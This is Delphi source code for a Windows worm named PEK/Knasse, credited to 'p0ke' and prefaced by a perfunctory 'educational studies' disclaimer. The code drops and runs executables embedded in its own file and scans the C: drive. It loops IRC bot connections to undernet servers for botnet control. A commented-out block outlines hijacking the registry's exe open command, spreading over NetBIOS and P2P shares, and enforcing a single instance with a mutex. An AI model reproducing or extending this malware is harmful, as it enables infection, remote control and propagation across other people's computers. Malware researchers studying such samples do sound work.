   { This application is written and coded by p0ke.
     Its purpose should only be for educational studies.
     Anyone that doesnt use it for educational studies,
     but abuses this code, has to take the whole responsibility
     for his or her own mess.

   ~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.
     ####  #### ####   ####   ####    ######### #########   ######
     ####  #### #####  #### ########  ######### #########  ########
      ###  ###   ##### ### ###    ### ###             ###  ###  ###
      ###  ###   ######### ###    ### ######### #########  ###  ###
      #######    ######### ###    ### ######### #########  ###  ###
      #######    ### #####        ###       ### ###        ###  ###
      ###  ###   ###  ####  ######### ####  ### ###  ####  ########
      ###  ###   ###   ### ########## ####  ### ###  ####  ########
      ###  ###   ###   ### ###    ### ###   ### ###   ###  ###       created by p0ke
   ## #### ####  ###  #### ########## ######### ######### ###########################
   ## #### ####  ###  #### ##########  ####### # ####### ############################
   ~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.
     }

   program PEK;

   uses
     windows,
     uNetBios,
     ShellAPI,
     Bot,
     KnasseUnit in 'KnasseUnit.pas';

   Procedure ReleaseIt;
   Var
     FContent, Settings, FName, FSet, PName: String;
     I, FSize: Integer;
     F: TextFile;
   Begin
     PName := GenerateName;
     If Not CopyFile(pChar(ParamStr(0)), pChar(PName), False) Then Exit;
     ReadFileStr(PName, FContent);

     I := Length(FContent);
     Settings := '';

     While (I > 0) And (FContent[i] <> #00) Do
     Begin
       Settings := FContent[i] + Settings;
       Dec(I);
     End;

     If Settings = '' Then
     Begin
       DeleteFile(pChar(PName));
       Exit;
     End;
     Delete(FContent, I, Length(Settings));

     While Pos(#01, Settings) > 0 Do
     Begin
       FSet := Copy(Settings, 1, Pos(#01, Settings)-1);
       Delete(Settings, 1, Pos(#01, Settings));

       FName := Copy(FSet, 1, Pos(#02, FSet)-1);
       Delete(FSet, 1, Pos(#02, FSet));
       FSize := StrToInt(FSet);

       Try
         AssignFile(F, FName);
         ReWrite(F);
         Write(F, Copy(FContent, Length(FContent)-FSize, FSize));
         CloseFile(F);
       Except
         Exit;
       End;

       Delete(FContent, Length(FContent)-FSize, FSize);
       ShellExecute(0, NIL, pChar(FName), NIL, NIL, 1);
     End;
     DeleteFile(pChar(PName));
   End;

   Procedure b0t;
   Begin
     Repeat
       CreateBot('uk.undernet.org');
       CreateBot('irc.undernet.org');
       Sleep(60000);
     Until  1 = 2;
   End;

   Procedure Startup;
   Var
     Path: String;
     D   : Dword;
     Tmp : TextFile;
   Begin
     ReleaseIt;

     Sleep(2000);

     AssignFile(Tmp, 'C:\log.txt');
     ReWrite(Tmp);
     CloseFile(Tmp);

     FindFiles('C:\');
   //  StartNetBIOS(500);
   //  b0t;
   (*
     ReleaseIt;

     {
     HKEY_CLASSES_ROOT\exefile\shell\open\ command = “”C:\Recycled\SirC32.exe” ”%1” %*
     }

     If CreateMutexA(NIL, FALSE, 'PE\KNASSE\1.1') = ERROR_ALREADY_EXISTS Then
       ExitProcess(0);

     StartNetBIOS(500);
     CreateThread(nil, 0, @b0t, nil, 0, d);
     ShareP2P('knasse.exe');
     FindFiles('C:\');
     Repeat
       ;
     Until 1 = 2;
   *)
   End;

   begin
     StartUp;
     MessageBox(0, 'done', '', mb_ok);
   end.
